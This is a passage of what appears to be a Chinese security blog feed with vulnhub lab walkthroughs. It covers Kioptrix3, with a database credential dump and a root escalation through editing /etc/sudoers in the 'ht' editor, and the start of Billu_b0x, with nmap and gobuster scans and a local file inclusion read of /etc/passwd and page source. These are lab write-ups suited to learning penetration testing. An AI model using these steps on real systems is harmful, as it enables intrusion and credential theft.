admin.dat<br>631271 -rwxrwxrwx 1 root     root        0 Apr 11  2010 index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat admin.dat<br>cat admin.dat<br>|318d8dd409db395f0317efa71b3bad13e1fb9857|administrator|bla@bla.com<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ <br></code></pre></td></tr></table></figure><p>admin.dat里有密码，尝试在线网站破解失败，尝试一下本地破解？</p><p>接着搜集一下信息吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ ls gallery<br>ls gallery<br>BACK         gfooter.php     logout.php        readme.html    tags.php<br>db.sql       gfunctions.php  p.php             recent.php     themes<br>g.php        gheader.php     photos            register.php   version.txt<br>gadmin       index.php       photos.php        scopbin        vote.php<br>gallery.php  install.BAK     post_comment.php  search.php<br>gconfig.php  login.php       profile.php       slideshow.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat ./gallery/gconfig.php<br>cat ./gallery/gconfig.php<br>&lt;?php<br>        error_reporting(0);<br>        /*<br>                A sample Gallarific configuration file. You should edit<br>                the installer details below and save this file as gconfig.php<br>                Do not modify anything else if you don&#x27;t know what it is.<br>        */<br><br>        // Installer Details -----------------------------------------------<br><br>        // Enter the full HTTP path to your Gallarific folder below,<br>        // such as http://www.yoursite.com/gallery<br>        // Do NOT include a trailing forward slash<br><br>        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;<br><br>        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;<br><br>        // Setting Details -------------------------------------------------<br><br>if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;<br>                echo(&quot;A connection to the database couldn&#x27;t be established: &quot; . mysql_error());<br>                die();<br>&#125;else &#123;<br>        if(!$g_mysql_d = @mysql_select_db($GLOBALS[&quot;gallarific_mysql_database&quot;], $g_mysql_c)) &#123;<br>                echo(&quot;The Gallarific database couldn&#x27;t be opened: &quot; . mysql_error());<br>                die();<br>        &#125;else &#123;<br>                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);<br>                if(mysql_num_rows($settings)!=0)&#123;<br>                        while($data=mysql_fetch_array($settings))&#123;<br>                                $GLOBALS[&quot;&#123;$data[&#x27;settings_name&#x27;]&#125;&quot;]=$data[&#x27;settings_value&#x27;];<br>                        &#125;<br>                &#125;<br><br>        &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>拿到了数据库的用户名和密码，登录mysql数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p<br>mysql -u root -p<br>Enter password: fuckeyou<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 10<br>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show database;</span><br>show database;<br>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;database&#x27; at line 1<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema | <br>| gallery            | <br>| mysql              | <br>+--------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">use gallery</span><br>use gallery<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br>show tables;<br>+----------------------+<br>| Tables_in_gallery    |<br>+----------------------+<br>| dev_accounts         | <br>| gallarific_comments  | <br>| gallarific_galleries | <br>| gallarific_photos    | <br>| gallarific_settings  | <br>| gallarific_stats     | <br>| gallarific_users     | <br>+----------------------+<br>7 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from gallarific_users</span><br>select * from gallarific_users<br>    -&gt; ;<br>;<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | <br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>1 row in set (0.01 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from dev_accounts</span><br>select * from dev_accounts<br>    -&gt; ;<br>;<br>+----+------------+----------------------------------+<br>| id | username   | password                         |<br>+----+------------+----------------------------------+<br>|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | <br>|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | <br>+----+------------+----------------------------------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>发现了许多东西啊……，admin尝试登录后台失败，下面两个用户登录也失败，尝试一下登录ssh，admin失败，loneferret成功</p><p><img src="/pic/935cd37da07c7bb5d1552029814721dc_MD5.png" alt="image.png"></p><p>登录也成功</p><h3 id="ht软件编辑器提权"><a href="#ht软件编辑器提权" class="headerlink" title="ht软件编辑器提权"></a>ht软件编辑器提权</h3><p>查看当前用户权限，发现ht具有root权限。而且提示我们ht是一个软件编辑器。</p><p><img src="/pic/6b771d75ba14de2d6b773bf8c24bbee9_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install terminal.app  <span class="hljs-comment"># 这里我是安装terminal.app利用的</span><br> <br>terminal  <span class="hljs-comment"># 运行</span><br> <br>出现蓝色界面，按F3，然后输入/etc/sudoers，回车<br></code></pre></td></tr></table></figure><p><img src="/pic/2c5bf1a78c429071308d154963ba5294_MD5.png"></p><p>添加如下图内容，然后按 F2保存，Ctrl+c 退出即可。</p><p><img src="/pic/a2722597f306cadc9d82853b5cec799c_MD5.png"></p><p>重新查看用户权限，发现已经成功添加，sudo执行即可获取root权限。</p><p><img src="/pic/48a30c7cc9392cf98cd5c623dd35b833_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Billu_b0x靶机</title>
    <link href="/2023/05/f998d5ae2c5e.html"/>
    <url>/2023/05/f998d5ae2c5e.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>这台靶机包含的内容比较多，信息收集、本地文件读取、代码审计、SQL 注入等，需要具有比较全面的安全知识，并且要对网站的目录结构和逻辑有较为清晰的认识，才能在打靶机的过程中游刃有余，从而形成自己的渗透思路。</p></blockquote><h1 id="Billu-b0x-靶机"><a href="#Billu-b0x-靶机" class="headerlink" title="Billu_b0x 靶机"></a>Billu_b0x 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -p22,80 10.10.10.161 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-24 04:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.161<br>Host is up (0.00024s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)<br>|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)<br>|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-title: --==[[Indipowershell Lab]]==--<br>|_http-server-header: Apache/2.2.22 (Ubuntu)<br>MAC Address: 00:0C:29:A9:A2:24 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.88 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.10.10.161<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-24 04:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.161<br>Host is up (0.00028s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>| http-enum: <br>|   /test.php: Test page<br>|_  /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.2.22 (ubuntu)&#x27;</span><br>| http-internal-ip-disclosure: <br>|_  Internal IP Leaked: 127.0.1.1<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">MAC Address: 00:0C:29:A9:A2:24 (VMware)</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.03 seconds</span><br></code></pre></td></tr></table></figure><p>似乎没有得到特别有效的信息，倒是有个特殊的文件 test.php 那就进入 web 查看环节吧</p><h2 id="Web-服务查看"><a href="#Web-服务查看" class="headerlink" title="Web 服务查看"></a>Web 服务查看</h2><p>首先看看 80 端口，是一个登录界面，感觉可能存在 sql 注入，尝试使用’符号来注入，失败。接下来分别使用了常用的”,},)进行闭合，似乎简单的注入并没有用，可能是存在过滤或者替换吧，目录爆破看看吧 </p><p><img src="/pic/cbef8013431f8f2800f8b83e9c1e628b_MD5.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo gobuster <span class="hljs-built_in">dir</span> <span class="hljs-literal">-u</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/ <span class="hljs-literal">-w</span> /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt <span class="hljs-literal">-x</span> php,txt,html <span class="hljs-literal">-t</span> <span class="hljs-number">64</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>===============================================================<br>Gobuster v3.<span class="hljs-number">2.0</span><span class="hljs-literal">-dev</span><br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<br>[+] Method:                  GET<br>[+] Threads:                 <span class="hljs-number">64</span><br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory<span class="hljs-literal">-list-2</span>.<span class="hljs-number">3</span><span class="hljs-literal">-medium</span>.txt<br>[+] Negative Status codes:   <span class="hljs-number">404</span><br>[+] User Agent:              gobuster/<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><span class="hljs-literal">-dev</span><br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 <span class="hljs-number">10</span>s<br>===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">13</span>:<span class="hljs-number">15</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/images               (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">313</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">images</span>/]<br>/index.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">3267</span>]<br>/c.php                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/c                    (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/in.php               (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47526</span>]<br>/<span class="hljs-keyword">in</span>                   (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">47522</span>]<br>/show                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/show.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">1</span>]<br>/add.php              (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/add                  (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">307</span>]<br>/test                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/test.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">72</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/head.php             (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/head                 (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2793</span>]<br>/uploaded_images      (Status: <span class="hljs-number">301</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">322</span>] [--&gt; <span class="hljs-type">http</span>://<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>/<span class="hljs-type">uploaded_images</span>/]                                                                                      <br>/panel                (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/panel.php            (Status: <span class="hljs-number">302</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2469</span>] [--&gt; <span class="hljs-type">index.php</span>]<br>/head2                (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/head2.php            (Status: <span class="hljs-number">200</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">2468</span>]<br>/.html                (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">285</span>]<br>/server<span class="hljs-literal">-status</span>        (Status: <span class="hljs-number">403</span>) [<span class="hljs-type">Size</span>: <span class="hljs-number">293</span>]<br>Progress: <span class="hljs-number">879939</span> / <span class="hljs-number">882244</span> (<span class="hljs-number">99.74</span>%)===============================================================<br><span class="hljs-number">2023</span>/<span class="hljs-number">05</span>/<span class="hljs-number">24</span> <span class="hljs-number">05</span>:<span class="hljs-number">16</span>:<span class="hljs-number">07</span> Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>确实有些有意思的目录，images，c，show，add，test，head，uploaded_images，panel，head2.php，挨个查看</p><p>images 目录</p><p><img src="/pic/e95e3608674cd1bdda207590df01467b_MD5.png"></p><p>add 目录，尝试 add 上传图片但是失败，并没有在 uploaded_images 中看到上传的文件</p><p><img src="/pic/5b518a1330c189395ffc4a7e8da149de_MD5.png"></p><p>uploaded_images 目录，这里的 1.jpg 是后面的后面才上传成功的，与刚才直接尝试上传无关</p><p><img src="/pic/87d9319a7ff9b6f3c36c6e1f52cc3a04_MD5.png"></p><p>c, show 无回显，panel 返回到登录界面</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>test. php</p><p><img src="/pic/a2753f261c0e728fb2c5db739b813bf9_MD5.png"></p><p>提示缺少参数 file，尝试在 url 中添加</p><p><img src="/pic/ed3faeeb3039d77dd1b1a62097275521_MD5.png"></p><p>失败，那就尝试使用 POST 方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=/etc/passwd&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>root:x:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:root:/root:/bin/bash<br>daemon:x:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>:daemon:/usr/sbin:/bin/sh<br>bin:x:<span class="hljs-number">2</span>:<span class="hljs-number">2</span>:bin:/bin:/bin/sh<br>sys:x:<span class="hljs-number">3</span>:<span class="hljs-number">3</span>:sys:/dev:/bin/sh<br>sync:x:<span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:sync:/bin:/bin/sync<br>games:x:<span class="hljs-number">5</span>:<span class="hljs-number">60</span>:games:/usr/games:/bin/sh<br><span class="hljs-built_in">man</span>:x:<span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-built_in">man</span>:/var/cache/<span class="hljs-built_in">man</span>:/bin/sh<br><span class="hljs-built_in">lp</span>:x:<span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-built_in">lp</span>:/var/spool/lpd:/bin/sh<br>mail:x:<span class="hljs-number">8</span>:<span class="hljs-number">8</span>:mail:/var/mail:/bin/sh<br>news:x:<span class="hljs-number">9</span>:<span class="hljs-number">9</span>:news:/var/spool/news:/bin/sh<br>uucp:x:<span class="hljs-number">10</span>:<span class="hljs-number">10</span>:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:<span class="hljs-number">13</span>:<span class="hljs-number">13</span>:proxy:/bin:/bin/sh<br>www<span class="hljs-literal">-data</span>:x:<span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www<span class="hljs-literal">-data</span>:/var/www:/bin/sh<br>backup:x:<span class="hljs-number">34</span>:<span class="hljs-number">34</span>:backup:/var/backups:/bin/sh<br>list:x:<span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List Manager:/var/list:/bin/sh<br>irc:x:<span class="hljs-number">39</span>:<span class="hljs-number">39</span>:ircd:/var/run/ircd:/bin/sh<br>gnats:x:<span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug<span class="hljs-literal">-Reporting</span> System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:<span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:nobody:/nonexistent:/bin/sh<br>libuuid:x:<span class="hljs-number">100</span>:<span class="hljs-number">101</span>::/var/lib/libuuid:/bin/sh<br>syslog:x:<span class="hljs-number">101</span>:<span class="hljs-number">103</span>::/home/syslog:/bin/false<br>mysql:x:<span class="hljs-number">102</span>:<span class="hljs-number">105</span>:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:<span class="hljs-number">103</span>:<span class="hljs-number">106</span>::/var/run/dbus:/bin/false<br>whoopsie:x:<span class="hljs-number">104</span>:<span class="hljs-number">107</span>::/nonexistent:/bin/false<br>landscape:x:<span class="hljs-number">105</span>:<span class="hljs-number">110</span>::/var/lib/landscape:/bin/false<br>sshd:x:<span class="hljs-number">106</span>:<span class="hljs-number">65534</span>::/var/run/sshd:/usr/sbin/nologin<br>ica:x:<span class="hljs-number">1000</span>:<span class="hljs-number">1000</span>:ica,,,:/home/ica:/bin/bash<br></code></pre></td></tr></table></figure><p>得到了一些用户信息，验证了存在远程文件包含漏洞。接下来我们利用目录爆破的结果获取一下几个文件的内容</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~]<br>└─$ curl -X POST --data <span class="hljs-string">&quot;file=./index.php&quot;</span> http:<span class="hljs-comment">//10.10.10.161/test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;head.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=<span class="hljs-literal">true</span>)<br>&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]=<span class="hljs-string">&#x27;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]==<span class="hljs-literal">true</span> &amp;&amp;  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]!=<span class="hljs-string">&#x27;&#x27;</span>)<br>&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are logged in :)&quot;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: panel.php&#x27;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span><br><span class="hljs-string">&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span><br><span class="hljs-string">&lt;br&gt;&lt;br&gt;</span><br><span 